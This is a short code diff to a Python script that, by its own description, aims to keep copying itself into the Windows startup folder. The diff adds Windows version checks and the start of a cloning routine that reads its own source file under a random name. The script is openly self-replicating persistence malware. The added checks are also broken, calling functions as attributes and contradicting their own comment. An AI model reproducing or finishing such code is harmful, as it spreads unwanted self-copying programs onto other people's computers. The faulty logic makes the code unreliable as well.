@@ -13,7 +13,11 @@ Aim keep reproducing itself in the window startup folder. only work for windows
 import os
 import random
 import numpy as np
-
+import platform
+# check windows 10 or below
+assert('windows' in platform.system)
+assert(platform.release>10)
+# cloning
 with open(__file__, "r") as f:
     selfs = f.readlines()
     name = random.randint(0, 9999999999999)
